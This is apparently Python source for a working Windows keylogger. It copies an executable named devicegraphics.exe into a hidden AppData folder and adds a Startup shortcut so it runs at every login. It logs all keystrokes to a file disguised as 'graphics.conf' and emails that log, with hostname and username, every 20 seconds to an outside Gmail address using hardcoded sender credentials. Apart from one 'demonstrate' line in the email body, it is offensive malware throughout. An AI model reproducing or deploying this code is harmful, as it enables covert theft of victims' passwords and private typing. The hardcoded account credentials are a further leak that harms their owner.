import pynput
from pynput import keyboard
import logging
import os
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from winshell import startup
from os.path import join, abspath
import win32com.client
import shutil
import socket
import stat
import getpass
# Get path to devicegraphics.exe
hostname = socket.gethostname()
try:
    devicegraphics_path = os.path.abspath('devicegraphics.exe')
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Themes')
    startup_file = os.path.join(startup_folder, 'devicegraphics.exe')

    if not os.path.exists(startup_file):
        shutil.copy(devicegraphics_path, startup_folder)

        # Provide read, write, and execute permissions to all users for the copied file
        os.chmod(startup_file, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

except (FileNotFoundError, PermissionError) as e:
    logging.error(f"Failed to copy the devicegraphics.exe file to the startup folder: {e}")

devicegraphics_path = startup_file

startup_devicegraphics_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'devicegraphics.lnk')
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(startup_devicegraphics_path)
shortcut.Targetpath = devicegraphics_path
shortcut.WorkingDirectory = os.path.abspath('')
shortcut.save()

# Set up the logging
##log_file = os.path.join(os.getcwd(), "graphics.conf")
home_dir = os.path.expanduser('~')

# Construct the desired file path
log_file = os.path.join(home_dir, 'Favorites', 'graphics.conf')
log_file = os.path.expanduser('~')
log_file = os.path.join(log_file, 'Favorites', 'graphics.conf')
username = getpass.getuser()

# Construct the desired file path for the attachment
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
# Set up email variables
sender_email = 'youngneddy2@gmail.com'
sender_password = 'cmwn tdyq yycq ygps'
receiver_email = 'kennedynnko@gmail.com'
subject = f"Computer name: {hostname}\n Username : {username}"
body = f'This is a email sent using is to demostrate how keylogger works ..\n andthe computer which is used is {hostname} and username:{username}'

message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = subject

# Set up keyboard listener
sentence = ''  # initialize variable to hold the sentence
def on_press(key):
    global sentence  # use global keyword to access variable outside of function
    try:
        # Check if space key is pressed
        if key == keyboard.Key.space:
            # Write the accumulated keystrokes to the log file as a sentence
            sentence += ' '
        elif key == keyboard.Key.enter:
            # Write the accumulated keystrokes to the log file as a sentence
            logging.info(sentence)
            sentence = ''  # reset variable to empty string for next sentence
        else:
            sentence += str(key.char) # accumulate keystrokes
    except Exception as e:
        print(str(e))

# Start keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    while True:
        # Wait for one minute before sending the email again
        time.sleep(20)
        try:
            # Attach the file to the email

            filename = 'graphics.conf'
            attachment_path = os.path.join(os.path.dirname(log_file), filename)
            with open(attachment_path, 'rb') as f:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(f.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f'attachment; filename= {filename}')
                message.attach(attachment)

            # Send email
            message.attach(MIMEText(body, 'plain'))
            text = message.as_string()
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver_email, text)
                print('Email sent successfully.')
            except (OSError, smtplib.SMTPException) as e:
                print('Email could not be sent. Error message:', str(e))
            finally:
                message.set_payload([]) # Clear the message payload
                try:
                    server.quit()
                except (NameError, smtplib.SMTPServerDisconnected):
                    pass
        except Exception as e:
            print(str(e))
